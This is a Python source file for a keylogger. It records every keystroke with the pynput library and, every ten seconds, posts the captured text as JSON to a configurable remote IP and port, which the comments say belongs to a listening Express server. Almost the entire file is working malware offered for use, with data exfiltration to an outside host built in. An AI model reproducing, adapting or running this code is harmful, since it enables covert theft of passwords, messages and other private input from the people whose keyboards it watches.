from pynput import keyboard
import requests
import json
import threading

text = ""
# NOTICE: change this IP address to your ip address from wich machine running on
# localhost adress is set by default
ip_address = "127.0.0.1"
# like the ipaddress change this to the running port number from express server
port = "8080"
# time between send keylog data 
time_interval = 10

def send_post_request():
    try:
        payload = json.dumps({"keyboardData" : text})
        r = requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
        timer = threading.Timer(time_interval, send_post_request)
        timer.start()
    except:
        print("Couldn't complete request!")
        exit(1)
 
        

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += '\n'
    elif key == keyboard.Key.tab:
        text += '\t'
    elif key == keyboard.Key.space:
        text += ' '
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


with keyboard.Listener(on_press= on_press) as listener:
    send_post_request()
    listener.join()



def main():
    with keyboard.Listener(on_press=on_press) as listener:
        send_post_request()
        listener.join()
        
if __name__ == '__main__':
    try: 
        main()
    except KeyboardInterrupt:
        print("User ended Keylogger")
        exit(0)